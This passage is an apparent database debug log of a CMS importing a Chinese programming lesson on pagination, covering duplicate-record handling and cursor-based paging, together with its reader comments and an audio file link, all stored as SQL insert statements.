<span data-slate-object="text" data-key="1575"><span data-slate-leaf="true" data-offset-key="1575:0" 
data-first-offset="true"><span class="se-9debe3ea" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 结果过滤</span></span></span></span> </div> <div class="se-ce0abb2c 
" data-slate-type="paragraph" data-slate-object="block" data-key="1576"> <span data-slate-object="text" 
data-key="1577"><span data-slate-leaf="true" data-offset-key="1577:0" data-first-offset="true"><span 
data-slate-string="true">如果我们认定两次查询的结果中，可能出现重复，但是考虑到数据变更的速度是比较慢的，顺序的变化也是缓慢的，因此这个重复数据即便有，也会很少。那么，第二页展示的时候，我们把结果中第一页曾经出现过的这些个别的数据给干掉，这样就规避了数据重复的问题。</span></span></span> 
</div> <div class="se-ea621c75 " data-slate-type="paragraph" data-slate-object="block" data-key="1578"> 
<span data-slate-object="text" data-key="1579"><span data-slate-leaf="true" data-offset-key="1579:0" 
data-first-offset="true"><span data-slate-string="true">这大概是最简单的一种处理方式，但是其不足也是很明显的：</span></span></span> 
</div> <div class="se-39f34555" data-slate-type="list" data-slate-object="block" data-key="1580"> 
<div class="se-2f42eaf6 se-ae723a70" data-slate-type="list-line" data-slate-object="block" 
data-key="1581"> <span data-slate-object="text" data-key="1582"><span data-slate-leaf="true" 
data-offset-key="1582:0" data-first-offset="true"><span data-slate-string="true">说是“个别数据”，可到底有多少重复，这终究存在不可预测性，极端情况下第二页的数据可能会出现大量和第一页重复的情况，删除这些重复数据会导致第二页数据量特别少，从而引发糟糕的用户体验；</span></span></span> 
</div> <div class="se-8f246d41 se-996c0cb6" data-slate-type="list-line" data-slate-object="block" 
data-key="1583"> <span data-slate-object="text" data-key="1584"><span data-slate-leaf="true" 
data-offset-key="1584:0" data-first-offset="true"><span data-slate-string="true">数据丢失问题：既然第二页上出现第一页的重复，那就意味着存在某数据在用户查询第一页的时候它待在第二页，而用户查询第二页的时候又跑到第一页上去了，这样的数据最终没有返回给用户；</span></span></span> 
</div> <div class="se-bb1e2bfd se-4703eac3" data-slate-type="list-line" data-slate-object="block" 
data-key="1585"> <span data-slate-object="text" data-key="1586"><span data-slate-leaf="true" 
data-offset-key="1586:0" data-first-offset="true"><span data-slate-string="true">有第一页、第二页，那就还有第三页、第四页的问题，比如第一页的数据可能跟第四页重复啊，如果我们把这些因素都考虑进去，这个方案就没有那么“简单”了。</span></span></span> 
</div> </div> <div class="se-af06c60e " data-slate-type="paragraph" data-slate-object="block" 
data-key="1587"> <span data-slate-object="text" data-key="1588"><span data-slate-leaf="true" 
data-offset-key="1588:0" data-first-offset="true"><span class="se-d35c7b25" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">2. 独立的排序版本</span></span></span></span> 
</div> <div class="se-3967e28c " data-slate-type="paragraph" data-slate-object="block" data-key="1589"> 
<span data-slate-object="text" data-key="1590"><span data-slate-leaf="true" data-offset-key="1590:0" 
data-first-offset="true"><span data-slate-string="true">这个方法原理上也很简单，对于任何排序，都维持一个版本号。这样，在数据产生变化的时候，这个新的排序，需要采用一个不同的版本号。本质上，这就是把每次排序都单独拿出来维护，每一个排序都有一份独立的拷贝。</span></span></span> 
</div> <div class="se-5cbf9547 " data-slate-type="paragraph" data-slate-object="block" data-key="1591"> 
<span data-slate-object="text" data-key="1592"><span data-slate-leaf="true" data-offset-key="1592:0" 
data-first-offset="true"><span data-slate-string="true">这种方法适合这个排序变更不太频繁的情况，因为它的缺点很明显，就是要给每一份排序单独存放一份完整的拷贝。但是，它的优点也很明显，就是在多次查询的过程中，这个列表是静态的，不会改变的，不需要担心数据重复和丢失的问题。特别是对于开放的 
Web API 来说，我们经常需要用一个循环多次查询才能获取全量的数据，这个机制就很有用了。</span></span></span> </div> <div class="se-4e98c30b 
" data-slate-type="paragraph" data-slate-object="block" data-key="1593"> <span data-slate-object="text" 
data-key="1594"><span data-slate-leaf="true" data-offset-key="1594:0" data-first-offset="true"><span 
class="se-3fb81bc8" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">3. 
数据队列</span></span></span></span> </div> <div class="se-22cfbc40 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1595"> <span data-slate-object="text" data-key="1596"><span 
data-slate-leaf="true" data-offset-key="1596:0" data-first-offset="true"><span data-slate-string="true">在某些场景下，我们如果能保证数据的顺序不变，而添加的数据总在显示列表的一头，也就是说，把原本的数据集合变成一个队列，这样要解决重复数据问题的时候，就会有比较好的解决办法了。</span></span></span> 
</div> <div class="se-e2d4f134 " data-slate-type="paragraph" data-slate-object="block" data-key="1597"> 
<span data-slate-object="text" data-key="1598"><span data-slate-leaf="true" data-offset-key="1598:0" 
data-first-offset="true"><span class="se-900cbfeb" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">每次查询的时候，都记住了当前页最后一条记录的位置（比如我们可以使用自增长的 ID，或是使用数据添加时的 timestamp 来作为它“位置”的标记），而下一页，就从该记录开始继续往后查找就好了。</span></span></span></span><span 
data-slate-object="text" data-key="1599"><span data-slate-leaf="true" data-offset-key="1599:0" 
data-first-offset="true"><span data-slate-string="true">这样无论是否有新添加的数据，后面页数的切换，使用的都是相对位置，也就不会出现数据重复的问题了。看下面的例子：</span></span></span> 
</div> <div class="se-214e6710" data-slate-type="image" data-slate-object="block" data-key="1600"> 
<img class="se-8bc69a36" src="https://static001.geekbang.org/resource/image/76/0a/765eaf5e95d1edfb6480bec2419e4f0a.png"> 
</div> <div class="se-17a6b3b5 " data-slate-type="paragraph" data-slate-object="block" data-key="1601"> 
<span data-slate-object="text" data-key="1602"><span data-slate-leaf="true" data-offset-key="1602:0" 
data-first-offset="true"><span data-slate-string="true">你看，用户刚访问的时候，返回了 data 150 到 data 199 
这 50 条记录，并且记住了当前页尾的位置。用户再访问第二页的时候，其实已经有新的元素 data 200 加进来了，但是不管它，我们根据前一页的页尾的位置找到了第二页开头的位置，返回 
data 100 到 data 149 这 50 条记录。</span></span></span> </div> <div class="se-626af834 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1603"> <span data-slate-object="text" data-key="1604"><span 
data-slate-leaf="true" data-offset-key="1604:0" data-first-offset="true"><span data-slate-string="true">当然，只有一种例外，即只有用户访问第一页的时候（或者说，是用户的查询传入的“位置”参数为空的时候），才始终查询并返回最新的第一页数据。比如现在 
data 200 已经添加进来了，查询第一页的时候就返回 data 151 到 data 200 这最新的 50 条数据：</span></span></span> </div> <div 
class="se-c4b8cd86" data-slate-type="image" data-slate-object="block" data-key="1605"> <img 
class="se-e02845c7" src="https://static001.geekbang.org/resource/image/31/15/3187828c0233827684c8735e6f74c615.png"> 
</div> <div class="se-9eb658a8 " data-slate-type="paragraph" data-slate-object="block" data-key="1606"> 
<span data-slate-object="text" data-key="1607"><span data-slate-leaf="true" data-offset-key="1607:0" 
data-first-offset="true"><span data-slate-string="true">上述这种方式其实也挺常见的，特别像是新闻类网站（还有一些 SNS 网站），基本上一个栏目下新闻的发布都可以遵循这个队列的规则，即新发布的新闻总是可以放在最开始的位置，发布以后的新闻相对位置不发生改变。还有就是许多 
NoSQL 数据库用于查询特定页的 token，都是利用了这个机制。</span></span></span> </div> <h2 class="se-08808a82" data-slate-type="heading" 
data-slate-object="block" data-key="1608"><span data-slate-object="text" data-key="1609"><span 
data-slate-leaf="true" data-offset-key="1609:0" data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> 
<div class="se-c160fb76 " data-slate-type="paragraph" data-slate-object="block" data-key="1610"> 
<span data-slate-object="text" data-key="1611"><span data-slate-leaf="true" data-offset-key="1611:0" 
data-first-offset="true"><span data-slate-string="true">今天我们一起学习了分页的前前后后，既包括设计、实现，也包括对分页常见的重复数据的问题的分析，希望今天的内容能让你有所收获。</span></span></span> 
</div> <div class="se-8f41ddd5 " data-slate-type="paragraph" data-slate-object="block" data-key="1612"> 
<span data-slate-object="text" data-key="1613"><span data-slate-leaf="true" data-offset-key="1613:0" 
data-first-offset="true"><span data-slate-string="true">老规矩，我来提两个问题吧：</span></span></span> 
</div> <div class="se-b6ce342c" data-slate-type="list" data-slate-object="block" data-key="1614"> 
<div class="se-cddc2062 se-a3a2e2a2" data-slate-type="list-line" data-slate-object="block" 
data-key="1615"> <span data-slate-object="text" data-key="1616"><span data-slate-leaf="true" 
data-offset-key="1616:0" data-first-offset="true"><span data-slate-string="true">对于文中介绍的工具类 
Paginatior，我把方法签名写出来了，你能把这个类实现完整吗？</span></span></span> </div> <div class="se-f695cc87 se-9c2632ed" 
data-slate-type="list-line" data-slate-object="block" data-key="1617"> <span data-slate-object="text" 
data-key="1618"><span data-slate-leaf="true" data-offset-key="1618:0" data-first-offset="true"><span 
data-slate-string="true">对于“分页代码设计”一节中介绍的两种分页对象的设计方法，它们各有优劣，你能比较一下吗？</span></span></span> </div> 
</div> <div class="se-20340b13 " data-slate-type="paragraph" data-slate-object="block" data-key="1619"> 
<span data-slate-object="text" data-key="1620"><span data-slate-leaf="true" data-offset-key="1620:0" 
data-first-offset="true"><span data-slate-string="true">好，今天就到这里，欢迎你在留言区和我讨论。</span></span></span> 
</div> <h2 class="se-6f65dade" data-slate-type="heading" data-slate-object="block" data-key="1621"><span 
data-slate-object="text" data-key="1622"><span data-slate-leaf="true" data-offset-key="1622:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-e3295f71" data-slate-type="list" data-slate-object="block" data-key="1623"> <div 
class="se-2aa7c0c0 se-17a1ca46" data-slate-type="list-line" data-slate-object="block" data-key="1624"> 
<span data-slate-object="text" data-key="1625"><span data-slate-leaf="true" data-offset-key="1625:0" 
data-first-offset="true"><span data-slate-string="true">对于 Hibernate 分页查询用到的条件查询 API，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1626" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="1627"><span data-slate-leaf="true" data-offset-key="1627:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="1628"><span data-slate-leaf="true" data-offset-key="1628:0" 
data-first-offset="true"><span data-slate-string="true">，看到更多的例子；而对于通过 Projection 来取得总行数的代码，</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1629" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="1630"><span data-slate-leaf="true" data-offset-key="1630:0" 
data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" 
data-key="1631"><span data-slate-leaf="true" data-offset-key="1631:0" data-first-offset="true"><span 
data-slate-string="true">有完整例子。</span></span></span> </div> <div class="se-9bcf9eb6 se-098db371" 
data-slate-type="list-line" data-slate-object="block" data-key="1632"> <span data-slate-object="text" 
data-key="1633"><span data-slate-leaf="true" data-offset-key="1633:0" data-first-offset="true"><span 
data-slate-string="true">本讲一开始的时候我提到，分页的设计上，有的是使用指定页码的，也是本讲的重点；还有一种是使用 token 的，这种方式也是很多 Web 
API 常提供的方式，你可以阅读 DynamoDB 的</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1634" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="1635"><span 
data-slate-leaf="true" data-offset-key="1635:0" data-first-offset="true"><span data-slate-string="true">官方文档</span></span></span></a><span 
data-slate-object="text" data-key="1636"><span data-slate-leaf="true" data-offset-key="1636:0" 
data-first-offset="true"><span data-slate-string="true">了解一下它的分页 API。</span></span></span> 
</div> </div> <div class="se-8b383575" data-slate-type="image" data-slate-object="block" data-key="1637"> 
<img class="se-7839c6bb" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 7, 7) 
 {executed in 18 msec}
2020-11-19 11:02:51.648 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=7 
 {executed in 1 msec}
2020-11-19 11:02:51.648 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:02:51.649 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=7 
 {executed in 0 msec}
2020-11-19 11:02:51.649 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:02:51.650 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754971, 1605754971, 1, 'zh-hans', 0, 1, 1, 
0, '38丨分页的那些事儿', 1, 7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.657 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=7 
 {executed in 0 msec}
2020-11-19 11:02:51.657 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:02:51.659 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754971, 1605754971, 1, 'zh-hans', 0, 
1, 1, 0, '38丨分页的那些事儿', 'book', 1, 7, 7) 
 {executed in 1 msec}
2020-11-19 11:02:51.663 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=7 
 {executed in 1 msec}
2020-11-19 11:02:51.663 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:02:51.664 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.664 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:02:51.665 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/cc016b7e0269ca0e0709a8ef603b691d?bkt=en-2e2b5030dd6ff0370bb80b25d15bf44ad1bc8d4829556b3524133f92b65f595caff700a71a511124&fid=3757516097-778750-599137417284805&time=1605754970&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-lswkWikf0b2mKTidLgCxogAc%2FtI%3D&to=92&size=12267162&sta_dx=12267162&sta_cs=2806&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575885230&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=12267162&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-89b3c19fe702d07182fae0fd70fbee529f049d3ea076134ad57ae85749e5322c12b2e4edc03a36ec&sl=76480590&expires=8h&rt=pr&r=692010382&mlogid=7501957611929646108&vbdid=2247232042&fin=38%E4%B8%A8%E5%88%86%E9%A1%B5%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.m4a&bflag=92,34-92&rtype=1&dp-logid=7501957611929646108&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=34c17094e7d5a0c9019e7c4ff6eb7cc884428c343ff1019d&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=38%E4%B8%A8%E5%88%86%E9%A1%B5%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.m4a', 
7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.669 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.670 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:02:51.671 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/cc016b7e0269ca0e0709a8ef603b691d?bkt=en-2e2b5030dd6ff0370bb80b25d15bf44ad1bc8d4829556b3524133f92b65f595caff700a71a511124&fid=3757516097-778750-599137417284805&time=1605754970&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-lswkWikf0b2mKTidLgCxogAc%2FtI%3D&to=92&size=12267162&sta_dx=12267162&sta_cs=2806&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575885230&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=12267162&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-89b3c19fe702d07182fae0fd70fbee529f049d3ea076134ad57ae85749e5322c12b2e4edc03a36ec&sl=76480590&expires=8h&rt=pr&r=692010382&mlogid=7501957611929646108&vbdid=2247232042&fin=38%E4%B8%A8%E5%88%86%E9%A1%B5%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.m4a&bflag=92,34-92&rtype=1&dp-logid=7501957611929646108&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=34c17094e7d5a0c9019e7c4ff6eb7cc884428c343ff1019d&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=38%E4%B8%A8%E5%88%86%E9%A1%B5%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.m4a', 
7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.675 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.676 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:02:51.677 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.678 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:02:51.679 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJrXzp40cuBgbfXMuWMe743Uw3IPfZvRAAdPa3WYru1V90qK683KcOppkt0Dpxg564zSsElZW3nlA/132" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>springday</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-07 </div> </div> <!----> 
</div> <div> <div class="_3M6kV3zb_0"> 解决了困扰了我多年的问题。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 😎</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-06 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 刚想说重复数据的问题，就提了。 <br>我们遇到情况就是，订单列表无所谓不是第一页，每次到页面触发按钮的时候直接请求最新的数据，量不多可以忽略。 
<br>但是首页的展示或者用的比较频繁就不能，这样看起来很怪，之前虎嗅的网页版具有类似的问题，下拉新的一页和上面的数据有相同的。我们的想法是，拿到前一页的最后一个id，作为参数请求下一页放进去控制。貌似有的分页插件有类似的功能，暂时还没研究。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: "最后一个 id"，就是文中我说的“数据队列”的方式。</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>许童童</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-06 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0 _3D2NkqD6_0"> 老师这一节讲的第三种方法，数据队列正是我在业务中使用到的，很精妙，很好的解决了问题 </div> 
<!----> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-06 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 数据库端做limit操作前端页面调用结果集这大概是最方面且最快捷的方式：调用的算法和数据结构同样简单；代价就是资源的消耗。无论是mysql还是sql 
server分页直接通过类似方式用的最多-时间代价相对小，擅长的东西做事擅长的事情。另外一种方式没尝试过。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 
7, 7) 
 {executed in 0 msec}
2020-11-19 11:02:51.683 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.684 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:02:51.685 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJrXzp40cuBgbfXMuWMe743Uw3IPfZvRAAdPa3WYru1V90qK683KcOppkt0Dpxg564zSsElZW3nlA/132" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>springday</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-07 </div> </div> <!----> 
</div> <div> <div class="_3M6kV3zb_0"> 解决了困扰了我多年的问题。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 😎</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
